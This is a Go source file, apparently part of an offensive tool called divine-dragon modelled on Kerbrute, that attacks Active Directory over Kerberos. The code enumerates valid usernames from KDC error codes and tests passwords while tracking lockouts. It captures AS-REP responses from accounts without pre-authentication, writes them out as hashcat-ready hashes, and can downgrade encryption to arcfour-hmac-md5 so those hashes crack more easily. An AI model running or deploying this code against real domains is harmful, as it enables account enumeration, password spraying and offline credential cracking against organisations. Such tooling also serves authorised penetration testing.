package transport

import (
	"fmt"
	"html/template"
	"os"
	"strings"

	"divine-dragon/util"

	"github.com/ropnop/gokrb5/v8/iana/errorcode"

	kclient "github.com/ropnop/gokrb5/v8/client"
	kconfig "github.com/ropnop/gokrb5/v8/config"
	"github.com/ropnop/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

type KerberosSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile     *os.File
	// Logger       *util.Logger
}

type KerberosSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
	//logger           *util.Logger
}

func NewKerberosSession(options KerberosSessionOptions) (k KerberosSession, err error) {
	if options.Domain == "" {
		return k, fmt.Errorf("domain must not be empty")
	}
	// if options.logger == nil {
	// 	logger := util.NewLogger(options.Verbose, "")
	// 	options.logger = &logger
	// }
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		//options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			//options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	realm := strings.ToUpper(options.Domain)
	configstring := buildKrb5Template(realm, options.DomainController)
	Config, err := kconfig.NewFromString(configstring)
	if options.Downgrade {
		Config.LibDefaults.DefaultTktEnctypeIDs = []int32{23} // downgrade to arcfour-hmac-md5 for crackable AS-REPs
		//options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}
	if err != nil {
		panic(err)
	}
	_, kdcs, err := Config.GetKDCs(realm, false)
	if err != nil {
		err = fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	k = KerberosSession{
		Domain:       options.Domain,
		Realm:        realm,
		Kdcs:         kdcs,
		ConfigString: configstring,
		Config:       Config,
		Verbose:      options.Verbose,
		SafeMode:     options.SafeMode,
		HashFile:     hashFile,
		//Logger:       options.logger,
	}
	return k, err

}

func buildKrb5Template(realm, domainController string) string {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

func (k KerberosSession) TestLogin(username, password string) (bool, error) {
	Client := kclient.NewWithPassword(username, k.Realm, password, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(true))
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerberosSession) TestUsername(username string) (bool, error) {
	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)

	cl := kclient.NewWithPassword(username, k.Realm, "foobar", k.Config, kclient.DisablePAFXFAST(true))

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		fmt.Printf(err.Error())
	}
	b, err := req.Marshal()
	if err != nil {
		return false, err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			// something went wrong, it's not a valid response
			return false, err
		}
		k.DumpASRepHash(ASRep)
		return true, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, nil
	default:
		return false, err

	}
}

func (k KerberosSession) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		//k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	// k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			// k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}

// TestLoginError returns true for certain KRB Errors that only happen when the password is correct
// The correct credentials we're passed, but the error prevented a successful TGT from being retrieved
func (k KerberosSession) TestLoginError(err error) (bool, error) {
	eString := err.Error()
	if strings.Contains(eString, "Password has expired") {
		// user's password expired, but it's valid!
		return true, fmt.Errorf("User's password has expired")
	}
	if strings.Contains(eString, "Clock skew too great") {
		// clock skew off, but that means password worked since PRE-AUTH was successful
		return true, fmt.Errorf("Clock skew is too great")
	}
	return false, err
}

func (k KerberosSession) HandleKerbError(err error) (bool, string) {
	eString := err.Error()

	// handle non KRB errors
	if strings.Contains(eString, "client does not have a username") {
		return true, "Skipping blank username"
	}
	if strings.Contains(eString, "Networking_Error: AS Exchange Error") {
		return false, "NETWORK ERROR - Can't talk to KDC. Aborting..."
	}
	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
	}

	// handle KRB errors
	if strings.Contains(eString, "KDC_ERR_WRONG_REALM") {
		return false, "KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting..."
	}
	if strings.Contains(eString, "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
		return true, "User does not exist"
	}
	if strings.Contains(eString, "KDC_ERR_PREAUTH_FAILED") {
		return true, "Invalid password"
	}
	if strings.Contains(eString, "KDC_ERR_CLIENT_REVOKED") {
		if k.SafeMode {
			return false, "USER LOCKED OUT and safe mode on! Aborting..."
		}
		return true, "USER LOCKED OUT"
	}
	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
	}
	if strings.Contains(eString, "KRB_AP_ERR_SKEW Clock skew too great") {
		return true, "Clock skew too great"
	}

	return false, eString
}
